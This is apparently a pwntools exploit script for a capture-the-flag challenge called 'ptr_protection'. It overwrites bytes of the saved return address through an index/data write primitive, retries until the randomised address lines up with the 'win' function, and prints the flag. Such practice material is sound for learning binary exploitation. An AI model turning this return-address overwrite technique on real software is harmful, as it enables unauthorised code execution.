from pwn import *

context.arch = "amd64"

CHALL_PATH = "./ptr_protection"

CHALL = ELF("./ptr_protection")

COMMANDS = '''
brva 0x1490
c
'''
stop = False
print("Win offset: ",hex(CHALL.symbols['win']))

while not stop:
    if args.REMOTE:
        pass
    else:
        if args.GDB:
            r = gdb.debug(CHALL_PATH, gdbscript=COMMANDS)
        else:
            r = process(CHALL_PATH)

    #insert data to make the saved_eip with the offset of win
    r.recvuntil(b"index: ")
    r.sendline(b"40")
    r.recvuntil(b"data: ")
    r.sendline(b"124")
    r.sendline(b"41")
    r.recvuntil(b"data: ")
    r.sendline(b"2")
    #make the program return
    r.recvuntil(b"index: ")
    r.sendline(b"-1")
    r.recvuntil(b"return ")
    returned_address = r.recv(14)
    returned_address = returned_address.decode()
    print(returned_address)
    if(returned_address[-3] == '2'):
        try:
            r.recvuntil(b"WIN!")
            flag = r.recv(21)
            stop = True
            print("Flag: ",flag.decode())
        except:
            continue
    else:
        r.close()


r.interactive()

